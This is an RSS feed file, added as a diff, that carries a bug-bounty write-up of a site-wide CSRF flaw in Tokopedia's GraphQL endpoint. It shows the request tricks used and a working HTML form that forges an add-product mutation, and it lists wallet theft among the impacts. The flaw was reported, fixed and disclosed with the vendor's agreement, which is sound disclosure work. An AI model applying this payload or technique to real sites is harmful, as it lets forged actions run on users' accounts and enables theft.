@@ -1,0 +1,129 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+	<channel>
+		<title>Yeraisci</title>
+		<description>Stylish Jekyll Theme</description>
+		<link>/</link>
+		<atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
+		
+			<item>
+				<title>[TOKOPEDIA] SITE-WIDE CSRF THROUGH GRAPHQL REQUEST</title>
+				<description>&lt;h2 id=&quot;what-is-cross-site-request-forgery-&quot;&gt;What is Cross Site Request Forgery ?&lt;/h2&gt;
+&lt;hr /&gt;
+
+&lt;p&gt;Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they’re currently authenticated. CSRF attacks specifically target state-changing requests, not theft of data, since the attacker has no way to see the response to the forged request.&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;what-is-graph-query-language-&quot;&gt;What is Graph Query Language ?&lt;/h2&gt;
+&lt;hr /&gt;
+
+&lt;p&gt;GraphQL is a query language for APIs and a runtime for fulfilling those queries with your existing data. GraphQL provides a complete and understandable description of the data in your API, gives clients the power to ask for exactly what they need and nothing more, makes it easier to evolve APIs over time, and enables powerful developer tools.&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;proof-of-concept&quot;&gt;Proof of Concept&lt;/h2&gt;
+&lt;hr /&gt;
+
+&lt;p&gt;When visiting &lt;a href=&quot;https://m.tokopedia.com/&quot;&gt;https://m.tokopedia.com&lt;/a&gt;, most of the request is using &lt;code class=&quot;highlighter-rouge&quot;&gt;GraphQL&lt;/code&gt; endpoint in &lt;a href=&quot;https://gql.tokopedia.com/&quot;&gt;https://gql.tokopedia.com&lt;/a&gt;.Here is the example request to add product to wishlist :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/example_request_add_wishlist.png&quot; alt=&quot;Example Request Add Wishlist&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;
+When looking at the request in burpsuite, i notice something interesting.The request to &lt;code class=&quot;highlighter-rouge&quot;&gt;GraphQL&lt;/code&gt; endpoint is not using an authentication key or token in the request header.Usually, &lt;code class=&quot;highlighter-rouge&quot;&gt;GraphQL&lt;/code&gt; is more like &lt;code class=&quot;highlighter-rouge&quot;&gt;API&lt;/code&gt; style that use authentication key to get data, but Tokopedia seems to implement the request to &lt;code class=&quot;highlighter-rouge&quot;&gt;GraphQL&lt;/code&gt; endpoint using session and cookie as authentication.&lt;br /&gt;
+&lt;br /&gt;
+Indeed, before make an actual request to get the data, it will check the authentication to &lt;code class=&quot;highlighter-rouge&quot;&gt;GraphQL&lt;/code&gt; using this request :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/request_check_auth_graphql.png&quot; alt=&quot;Authentication GraphQL&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;
+I’m thinking if we can somehow perform a CSRF attack to the &lt;code class=&quot;highlighter-rouge&quot;&gt;GraphQL&lt;/code&gt; endpoint.Then i try to modify request data in burpsuite.Several change that i made to the request :&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Remove the &lt;code class=&quot;highlighter-rouge&quot;&gt;Referer&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Set &lt;code class=&quot;highlighter-rouge&quot;&gt;Origin&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;null&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Set &lt;code class=&quot;highlighter-rouge&quot;&gt;content-type&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;text/plain&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Append &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;=&quot;&lt;/code&gt; to the end of body request&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Appending &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;=&quot;&lt;/code&gt; to the end of the body request is to test if we can make a request of &lt;code class=&quot;highlighter-rouge&quot;&gt;JSON&lt;/code&gt; data using post form in html and using enctype &lt;code class=&quot;highlighter-rouge&quot;&gt;text/plain&lt;/code&gt;.After modifying the request, test to send the request. (Example image below is request to change profile image)&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/example_request_change_picture.png&quot; alt=&quot;Modified Request&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;
+&lt;img src=&quot;/assets/media/shocked_bounty.gif&quot; class=&quot;media_center&quot; style=&quot;width: 50%; height: 50%&quot; /&gt;&lt;/p&gt;
+&lt;h4 align=&quot;center&quot;&gt;&lt;b&gt;And it works !&lt;/b&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;We can then craft a simple html to make a CSRF attack (This POC use sample request of uploading a product to the store) :&lt;/p&gt;
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Site Wide CSRF GraphQL : Add Product to Target User&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://gql.tokopedia.com/&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;POST&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;enctype=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text/plain&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[{&quot;operationName&quot;:&quot;AddProductMutation&quot;,&quot;variables&quot;:{&quot;input&quot;:{&quot;product_brand&quot;:{&quot;brand_id&quot;:0,&quot;name&quot;:&quot;&quot;},&quot;product_catalog&quot;:{&quot;catalog_id&quot;:0},&quot;product_category&quot;:{&quot;category_id&quot;:891},&quot;product_condition&quot;:1,&quot;product_description&quot;:&quot;Attacker&quot;,&quot;product_etalase&quot;:{&quot;etalase_id&quot;:17561860},&quot;product_free_return&quot;:false,&quot;product_min_order&quot;:1,&quot;product_must_insurance&quot;:false,&quot;product_name&quot;:&quot;Added by Attacker&quot;,&quot;product_picture&quot;:[{&quot;from_ig&quot;:0,&quot;description&quot;:&quot;&quot;,&quot;x&quot;:1,&quot;y&quot;:1,&quot;file_path&quot;:&quot;product-1/2019/2/6/44628626&quot;,&quot;file_name&quot;:&quot;44628626_6070a039-2f84-4d8c-99b8-c3d68083ebf7_980_759.png&quot;}],&quot;product_preorder&quot;:{&quot;preorder_process_time&quot;:0,&quot;preorder_status&quot;:0,&quot;preorder_time_unit&quot;:1},&quot;product_price&quot;:100,&quot;product_price_currency&quot;:1,&quot;product_sku&quot;:&quot;&quot;,&quot;product_status&quot;:1,&quot;product_stock&quot;:0,&quot;product_video&quot;:[],&quot;product_weight&quot;:100,&quot;product_weight_unit&quot;:1,&quot;product_wholesale&quot;:[]}},&quot;query&quot;:&quot;mutation AddProductMutation($input: AddProductInputType) {\n  addProduct(input: $input) {\n    header {\n      messages\n      reason\n      __typename\n    }\n    data {\n      product_id\n      product_name\n      product_alias\n      product_condition\n      product_description\n      product_last_update_price\n      product_min_order\n      product_max_order\n      product_must_insurance\n      product_price\n      product_price_currency\n      product_status\n      product_stock\n      product_weight\n      product_weight_unit\n      product_url\n      product_category {\n        category_id\n        __typename\n      }\n      product_etalase {\n        etalase_id\n        etalase_name\n        __typename\n      }\n      product_position {\n        position\n        __typename\n      }\n      product_shop {\n        shop_id\n        shop_name\n        shop_domain\n        shop_url\n        __typename\n      }\n      product_free_return\n      product_sku\n      product_gtin\n      product_name_editable\n      __typename\n    }\n    errors\n    __typename\n  }\n}\n&quot;}]'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Click Me !&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In above crafted html, is to make a CSRF request to add product to the store (by just modifying the &lt;code class=&quot;highlighter-rouge&quot;&gt;etalase_id&lt;/code&gt; to id that the targeted store own).When a targeted user or store account visit webpage that hosting this crafted html and click the submit button (or we can make this auto submit using javascript), the CSRF request will be fired and a product is added to the targeted store without user consent.&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;impact&quot;&gt;Impact&lt;/h2&gt;
+&lt;hr /&gt;
+
+&lt;p&gt;Seeing that request in &lt;a href=&quot;https://m.tokopedia.com/&quot;&gt;https://m.tokopedia.com&lt;/a&gt; mostly using &lt;code class=&quot;highlighter-rouge&quot;&gt;GraphQL&lt;/code&gt;, there is several impact from this security issue :&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Change user account profile picture&lt;/li&gt;
+  &lt;li&gt;Add, edit and delete product from the store&lt;/li&gt;
+  &lt;li&gt;Add, edit and delete address from user account&lt;/li&gt;
+  &lt;li&gt;Change profile picture, description, status, slogan of the store&lt;/li&gt;
+  &lt;li&gt;Add, edit and delete send address of the store&lt;/li&gt;
+  &lt;li&gt;Add, edit and delete store note&lt;/li&gt;
+  &lt;li&gt;Stealing tokopedia wallet by adding attacker bank account to targeted user account&lt;/li&gt;
+  &lt;li&gt;Perform anything about &lt;code class=&quot;highlighter-rouge&quot;&gt;order&lt;/code&gt; action behalf of the user&lt;/li&gt;
+  &lt;li&gt;etc&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;That’s all from my first blog post, see you again in my next blog post (hopefully).&lt;br /&gt;
+Happy Bug Hunting !&lt;/p&gt;
+
+&lt;h2 id=&quot;timeline&quot;&gt;Timeline&lt;/h2&gt;
+
+&lt;hr /&gt;
+
+&lt;table align=&quot;center&quot;&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Timestamp&lt;/th&gt;
+      &lt;th&gt;Description&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;February 6th 2019&lt;/td&gt;
+      &lt;td&gt;Report Submited&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;February 6th 2019&lt;/td&gt;
+      &lt;td&gt;Report is valid and marked as high severity&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;March 25th 2019&lt;/td&gt;
+      &lt;td&gt;Check the vulnerability is fixed and follow up to tokopedia team&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;March 25th 2019&lt;/td&gt;
+      &lt;td&gt;Tokopedia confirm the bug has been fixed&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;May 27th 2019&lt;/td&gt;
+      &lt;td&gt;Reward sent&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;July 15th 2019&lt;/td&gt;
+      &lt;td&gt;Tokopedia Agree to Disclose The Bug&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+</description>
+				<pubDate>Mon, 25 Mar 2019 00:00:00 +0700</pubDate>
+				<link>/bugbounty/tokopedia/site-wide-csrf-graphql/</link>
+				<guid isPermaLink="true">/bugbounty/tokopedia/site-wide-csrf-graphql/</guid>
+			</item>
+		
+	</channel>
+</rss>
